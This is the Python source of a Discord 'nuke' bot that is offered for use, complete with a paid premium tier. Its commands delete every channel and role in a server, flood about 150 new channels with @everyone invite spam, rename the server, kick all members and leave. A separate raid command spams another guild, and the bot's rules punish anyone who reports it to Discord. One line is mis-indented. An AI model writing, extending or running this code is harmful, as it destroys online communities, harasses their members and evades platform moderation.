import discord
from discord.ext import commands
import asyncio
import json
import os
from datetime import datetime, timedelta

# ── Config ────────────────────────────────────────────────────────────────────
OWNER_ID      = 1546620976966541485
BOOST_SERVER  = 1558615711411085454
PREMIUM_ROLE  = 1559663544860020776
TOKEN         = "YOUR_BOT_TOKEN_HERE"

# ── Premium storage ───────────────────────────────────────────────────────────
PREM_FILE = "premium.json"

def load_prem() -> dict:
    if not os.path.exists(PREM_FILE):
        return {}
    with open(PREM_FILE, "r") as f:
        return json.load(f)

def save_prem(data: dict):
    with open(PREM_FILE, "w") as f:
        json.dump(data, f, indent=2)

def has_prem(user_id: int) -> bool:
    data = load_prem()
    uid  = str(user_id)
    if uid not in data:
        return False
    expiry = datetime.fromisoformat(data[uid])
    if datetime.utcnow() > expiry:
        del data[uid]
        save_prem(data)
        return False
    return True

def grant_prem(user_id: int, duration: timedelta):
    data  = load_prem()
    uid   = str(user_id)
    base  = datetime.fromisoformat(data[uid]) if uid in data else datetime.utcnow()
    if base < datetime.utcnow():
        base = datetime.utcnow()
    expiry    = base + duration
    data[uid] = expiry.isoformat()
    save_prem(data)
    return expiry

def revoke_prem(user_id: int):
    data = load_prem()
    uid  = str(user_id)
    if uid in data:
        del data[uid]
        save_prem(data)

# ── Duration parser ───────────────────────────────────────────────────────────
def parse_duration(raw: str) -> timedelta | None:
    raw = raw.strip().lower()
    try:
        if raw.endswith("y"):
            return timedelta(days=365 * float(raw[:-1]))
        elif raw.endswith("m"):
            return timedelta(days=30 * float(raw[:-1]))
        elif raw.endswith("d"):
            return timedelta(days=float(raw[:-1]))
        elif raw.endswith("h"):
            return timedelta(hours=float(raw[:-1]))
    except ValueError:
        return None
    return None

# ── Boost → duration map ──────────────────────────────────────────────────────
def boost_to_duration(boost_count: int) -> timedelta:
    if boost_count <= 0:
        return timedelta(0)
    elif boost_count == 1:
        return timedelta(days=30)
    elif boost_count == 2:
        return timedelta(days=75)
    elif boost_count <= 4:
        return timedelta(days=150)
    else:
        extra_pairs = (boost_count - 4 + 1) // 2
        return timedelta(days=150 + extra_pairs * 75)

# ── Halloween font ────────────────────────────────────────────────────────────
COMBINING = [
    '\u0300', '\u0301', '\u0308', '\u030C', '\u030A',
    '\u0353', '\u0355', '\u0330', '\u0332', '\u0336',
    '\u20E4', '\u20E0', '\u20D6', '\u20D7', '\u20DB',
]

def glitch(text: str, intensity: int = 4) -> str:
    out = ""
    for ch in text:
        out += ch
        for c in COMBINING[:intensity]:
            out += c
    return out

HALLOWEEN_MAP = {
    'a':'𝔞','b':'𝔟','c':'𝔠','d':'𝔡','e':'𝔢','f':'𝔣','g':'𝔤','h':'𝔥',
    'i':'𝔦','j':'𝔧','k':'𝔨','l':'𝔩','m':'𝔲','n':'𝔫','o':'𝔬','p':'𝔭',
    'q':'𝔮','r':'𝔯','s':'𝔰','t':'𝔱','u':'𝔲','v':'𝔳','w':'𝔴','x':'𝔵',
    'y':'𝔶','z':'𝔷',
    'A':'𝔄','B':'𝔅','C':'ℭ','D':'𝔇','E':'𝔈','F':'𝔉','G':'𝔊','H':'ℌ',
    'I':'ℑ','J':'𝔍','K':'𝔎','L':'𝔏','M':'𝔐','N':'𝔑','O':'𝔒','P':'𝔓',
    'Q':'𝔔','R':'ℜ','S':'𝔖','T':'𝔗','U':'𝔘','V':'𝔙','W':'𝔚','X':'𝔛',
    'Y':'𝔜','Z':'ℨ',
}

def haunt(text: str) -> str:
    converted = "".join(HALLOWEEN_MAP.get(ch, ch) for ch in text)
    return glitch(converted, intensity=3)

# ── Channel + Category pools ──────────────────────────────────────────────────
CHANNEL_POOL = [
    "the-graveyard", "rotting-corpse", "six-feet-under", "coffin-nails", "dead-and-buried",
    "tombstone", "epitaph", "grave-robber", "decomposed", "exhumed",
    "haunted-manor", "ghost-in-the-walls", "poltergeist", "phantom-signal", "spirit-board",
    "seance-room", "possessed", "shadow-entity", "the-haunting", "restless-dead",
    "demon-core", "hellgate", "infernal", "sulfur-pit", "brimstone",
    "cursed-sigil", "ritual-circle", "blood-moon", "666", "unholy",
    "witches-brew", "black-cauldron", "hex", "cursed", "spellbound",
    "midnight-coven", "moonlit-ritual", "toil-and-trouble", "eye-of-newt", "poisoned-apple",
    "dont-look-back", "something-followed-you", "its-behind-you", "no-escape", "final-breath",
    "last-scream", "dead-end", "the-thing-in-dark", "cant-run", "already-dead",
    "jack-o-lantern", "pumpkin-rot", "carved-hollow", "candlelight-dies", "trick-or-treat",
    "all-hallows-eve", "harvest-of-souls", "the-witching-hour", "midnight-mass", "black-cat",
    "dead-signal", "null-seance", "corrupted-soul", "data-of-the-dead", "ghost-process",
    "phantom-thread", "zombie-process", "undead-packet", "cursed-loop", "eternal-segfault",
    "you-are-next", "no-survivors", "they-took-everyone", "run-while-you-can", "too-late-now",
    "already-watching", "never-left", "wont-find-you", "nowhere-to-hide", "found-you",
    "screaming-void", "terror", "dread", "omen", "doom",
    "apocalypse", "the-end-of-all", "oblivion", "eternal-darkness", "abyss",
]

CATEGORY_POOL = [
    haunt("HAUNTED GROUNDS"),
    haunt("THE CRYPT"),
    haunt("DEMON REALM"),
    haunt("WITCHES LAIR"),
    haunt("ETERNAL VOID"),
    haunt("NO ESCAPE"),
]

def get_channel_names(count: int = 150) -> list[str]:
    names = []
    pool  = CHANNEL_POOL.copy()
    i     = 0
    while len(names) < count:
        base = pool[i % len(pool)]
        if i < len(pool):
            names.append(haunt(base))
        else:
            names.append(haunt(f"{base}-{i // len(pool) + 1}"))
        i += 1
    return names[:count]

# ── Bot setup ─────────────────────────────────────────────────────────────────
ROLE_NAMES  = [glitch(n) for n in ["void","corrupted","error","null","broken","deleted","system","unknown"]]
SERVER_NAME = "< / PiXeL > _ .gg/jK7jVMZtxJ"
SPAM_COUNT  = 20

intents = discord.Intents.default()
intents.guilds          = True
intents.guild_messages  = True
intents.message_content = True
intents.members         = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ── Checks ────────────────────────────────────────────────────────────────────
def is_owner(ctx): return ctx.author.id == OWNER_ID
def is_premium(ctx): return has_prem(ctx.author.id) or ctx.author.id == OWNER_ID

# ── Core helpers ──────────────────────────────────────────────────────────────
async def delete_all_channels(guild):
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)

async def delete_all_roles(guild):
    deletable = [r for r in guild.roles if not r.is_default() and r < guild.me.top_role]
    await asyncio.gather(*[r.delete() for r in deletable], return_exceptions=True)

async def create_glitch_roles(guild):
    colors = [discord.Color.red(), discord.Color.dark_red(), discord.Color.purple(), discord.Color.dark_purple()]
    await asyncio.gather(*[
        guild.create_role(name=name, color=colors[i % len(colors)], hoist=True)
        for i, name in enumerate(ROLE_NAMES)
    ], return_exceptions=True)

async def create_glitch_channels(guild: discord.Guild, count: int = 150):
    channel_names = get_channel_names(count)
    per_cat       = 25
    all_channels  = []
    for cat_index, start in enumerate(range(0, count, per_cat)):
        cat_name = CATEGORY_POOL[cat_index % len(CATEGORY_POOL)]
        try:
            category = await guild.create_category(cat_name)
        except Exception:
            category = None
        batch   = channel_names[start:start + per_cat]
        results = await asyncio.gather(*[
            guild.create_text_channel(name, category=category) for name in batch
        ], return_exceptions=True)
        all_channels.extend([c for c in results if isinstance(c, discord.TextChannel)])
    return all_channels

async def spam_channels(channels, msg: str, times: int):
    tasks = [ch.send(msg) for ch in channels for _ in range(times)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def kick_all_and_leave(guild: discord.Guild):
    kick_tasks = [
        m.kick(reason="n0ked")
        for m in guild.members
        if m.id != guild.me.id and m.id != OWNER_ID
    ]
    await asyncio.gather(*kick_tasks, return_exceptions=True)
    try:
        await guild.leave()
    except Exception:
        pass

# ── !n0ke ─────────────────────────────────────────────────────────────────────
@bot.command(name="n0ke")
@commands.has_permissions(administrator=True)
async def nuke(ctx: commands.Context):
    guild    = ctx.guild
    spam_msg = "@everyone @here\n# JOIN https://discord.gg/jK7jVMZtxJ for the best n0ke bot"
await asyncio.gather(delete_all_channels(guild), delete_all_roles(guild))
    channels = await create_glitch_channels(guild)
    await create_glitch_roles(guild)
    await spam_channels(channels, spam_msg, SPAM_COUNT)
    await guild.edit(name=SERVER_NAME)
    await kick_all_and_leave(guild)

@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.MissingPermissions): pass

# ── !prem-n0ke <custom message> ───────────────────────────────────────────────
@bot.command(name="prem-n0ke")
@commands.has_permissions(administrator=True)
async def prem_nuke(ctx: commands.Context, *, message: str = None):
    if not is_premium(ctx):
        await ctx.send("no premium. boost the server or buy prem.")
        return
    guild    = ctx.guild
    spam_msg = message if message else ("@everyone 🎃 " + haunt("you got nuked") + " 💀🕸️")
    await asyncio.gather(delete_all_channels(guild), delete_all_roles(guild))
    channels = await create_glitch_channels(guild)
    await create_glitch_roles(guild)
    await spam_channels(channels, spam_msg, SPAM_COUNT)
    await guild.edit(name=SERVER_NAME)
    await kick_all_and_leave(guild)

@prem_nuke.error
async def prem_nuke_error(ctx, error):
    if isinstance(error, commands.MissingPermissions): pass

# ── !give-prem <userID> <duration> ───────────────────────────────────────────
@bot.command(name="give-prem")
async def give_prem(ctx: commands.Context, user_id: int = None, duration_raw: str = None):
    if not is_owner(ctx):
        await ctx.send("owner only.")
        return
    if not user_id or not duration_raw:
        await ctx.send("usage: `!give-prem <userID> <duration>`")
        return
    duration = parse_duration(duration_raw)
    if not duration:
        await ctx.send("bad duration. use: `1h` `1d` `2.5m` `1y`")
        return
    expiry = grant_prem(user_id, duration)
    await ctx.send(f"<@{user_id}> granted premium until `{expiry.strftime('%Y-%m-%d %H:%M UTC')}`.")

@give_prem.error
async def give_prem_error(ctx, error): pass

# ── !buy ──────────────────────────────────────────────────────────────────────
@bot.command(name="buy")
async def buy(ctx: commands.Context):
    embed = discord.Embed(
        title="⚡ N0KE BOT — PREMIUM",
        description="unlock `!prem-n0ke` with a custom spam message and priority features.",
        color=0x8B0000
    )
    embed.add_field(
        name="🚀 Method 1 — Boost Our Server",
        value=(
            "boost **this server** to get premium automatically.\n"
            "```\n"
            "1 boost  →  1 month\n"
            "2 boosts →  2.5 months\n"
            "3-4      →  5 months\n"
            "5-6      →  7.5 months\n"
            "```"
        ),
        inline=False
    )
    embed.add_field(
        name="🌐 Method 2 — Boost a Partner Server",
        value=(
            "⚠️ **LIMITED OFFER** — DM <@1546620976966541485> for the current partner server.\n"
            "same duration scale applies."
        ),
        inline=False
    )
    embed.add_field(
        name="💸 Method 3 — Pay Directly",
        value=(
            "DM <@1546620976966541485> with proof of payment.\n\n"
            "**PayPal** — DM for link\n"
            "**GCash** — DM for number\n"
        ),
        inline=False
    )
    embed.add_field(
        name="📌 Notes",
        value=(
            "• boosts stack — more boosts = longer premium\n"
            "• premium tied to your Discord account\n"
            "• unboost = premium revoked automatically\n"
            "• payment premium does **not** expire on unboost\n"
            "• no refunds"
        ),
        inline=False
    )
    embed.set_footer(text="N0KE BOT Premium • DM owner for support")
    await ctx.send(embed=embed)

# ── !rules ────────────────────────────────────────────────────────────────────
@bot.command(name="rules")
async def rules(ctx: commands.Context):
    embed = discord.Embed(
        title="📋 SERVER RULES",
        description=glitch("read or get wrecked"),
        color=0x8B0000
    )
    embed.add_field(name="01 — Respect", value="no harassment, slurs, or targeted hate. talk shit get kicked.", inline=False)
    embed.add_field(name="02 — No Snitching", value="what happens here stays here. reporting to Discord = instant ban.", inline=False)
    embed.add_field(name="03 — No Begging", value="don't beg for premium, roles, or perms. earn it or buy it.", inline=False)
    embed.add_field(name="04 — No Advertising", value="no server invites, no self-promo, no spam outside designated channels.", inline=False)
    embed.add_field(name="05 — Bot Commands", value="run commands in the right channels. spamming commands = mute.", inline=False)
    embed.add_field(name="06 — No Leaking", value="don't leak builds, tools, or anything shared here. violation = permanent ban.", inline=False)
    embed.add_field(name="07 — Owner Word is Law", value="<@1546620976966541485> has final say. no appeals.", inline=False)
    embed.add_field(name="08 — Premium Users", value="premium members get access to `!prem-n0ke`. don't abuse it.", inline=False)
    embed.set_footer(text="breaking rules = ban. no warnings.")
    await ctx.send(embed=embed)

# ── Boost automation ──────────────────────────────────────────────────────────
@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    if after.guild.id != BOOST_SERVER:
        return

    before_boosts = before.premium_since is not None
    after_boosts  = after.premium_since  is not None
    boost_count   = sum(1 for r in after.roles if r.is_premium_subscriber()) or (1 if after_boosts else 0)

    premium_role = after.guild.get_role(PREMIUM_ROLE)

    if after_boosts and not before_boosts:
        # grant premium storage
        duration = boost_to_duration(boost_count)
        expiry   = grant_prem(after.id, duration)

        # assign premium role
        if premium_role and premium_role not in after.roles:
            try:
                await after.add_roles(premium_role, reason="boost premium")
            except discord.Forbidden:
                pass

        try:
            await after.send(
                f"thanks for boosting! **{boost_count} boost(s)** → premium until "
                f"`{expiry.strftime('%Y-%m-%d %H:%M UTC')}`."
            )
        except discord.Forbidden:
            pass

    elif before_boosts and not after_boosts:
        # revoke premium storage
        revoke_prem(after.id)

        # remove premium role
        if premium_role and premium_role in after.roles:
            try:
                await after.remove_roles(premium_role, reason="boost removed")
            except discord.Forbidden:
                pass

        try:
            await after.send("boost removed — premium revoked.")
        except discord.Forbidden:
            pass

# ── !raid ─────────────────────────────────────────────────────────────────────
@bot.command(name="raid")
@commands.has_permissions(administrator=True)
async def raid(ctx: commands.Context, invite_code: str = None, *, message: str = None):
    if not invite_code:
        await ctx.send("usage: `!raid <invite_code> [message]`")
        return
    raid_msg = message if message else ("@everyone 🎃 " + haunt("you got nuked") + " 💀🕸️")
    try:
        invite = await bot.fetch_invite(invite_code)
    except discord.NotFound:
        await ctx.send("invite dead.")
        return
    except Exception as e:
        await ctx.send(f"fetch failed: {e}")
        return
    target_guild = bot.get_guild(invite.guild.id)
    if not target_guild:
        await ctx.send(f"bot isn't in `{invite.guild.name}`. add it first.\nguild id: `{invite.guild.id}`")
        return
    channels = [ch for ch in target_guild.text_channels if ch.permissions_for(target_guild.me).send_messages]
    if not channels:
        await ctx.send("no writable channels.")
        return
    await ctx.send(f"raiding `{target_guild.name}` — {len(channels)} channels, {SPAM_COUNT}x. firing.")
    await spam_channels(channels, raid_msg, SPAM_COUNT)
    await ctx.send("done.")

@raid.error
async def raid_error(ctx, error):
    if isinstance(error, commands.MissingPermissions): pass

# ── boot ──────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] online as {bot.user} ({bot.user.id})")
    print(f"[+] owner: {OWNER_ID} | boost server: {BOOST_SERVER} | premium role: {PREMIUM_ROLE}")

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

class Ping(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"alive")
    def log_message(self, *args): pass  # silence the access logs

def keep_alive():
    server = HTTPServer(("0.0.0.0", 8080), Ping)
    server.serve_forever()

threading.Thread(target=keep_alive, daemon=True).start()

bot.run(TOKEN)
